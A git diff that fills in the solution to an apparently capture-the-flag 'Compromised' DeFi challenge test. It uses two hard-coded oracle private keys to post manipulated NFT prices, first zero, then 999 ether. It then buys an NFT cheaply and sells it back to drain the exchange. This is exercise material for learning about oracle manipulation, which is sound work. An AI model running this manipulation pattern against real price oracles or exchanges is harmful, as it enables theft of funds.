@@ -52,7 +52,26 @@ describe('Compromised challenge', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        let oracleSource_1 = new ethers.Wallet("0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9", ethers.provider);
+        let oracleSource_2 = new ethers.Wallet("0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48", ethers.provider);
+        
+        await oracle.connect(oracleSource_1).postPrice('DVNFT', 0);
+        await oracle.connect(oracleSource_2).postPrice('DVNFT', 0);
+
+        console.log('Median price: ', await oracle.getMedianPrice('DVNFT'));
+
+        const tx = await exchange.connect(player).buyOne({value: 1n});
+        const receipt = await tx.wait();
+        console.log(receipt.events[1].args.price.toString());
+
+        await oracle.connect(oracleSource_1).postPrice('DVNFT', 999n * 10n ** 18n);
+        await oracle.connect(oracleSource_2).postPrice('DVNFT', 999n * 10n ** 18n);
+
+        console.log('Median price: ', await oracle.getMedianPrice('DVNFT'));
+
+        await nftToken.connect(player).approve(exchange.address, 0);
+        await exchange.connect(player).sellOne(0);
+        
     });
 
     after(async function () {
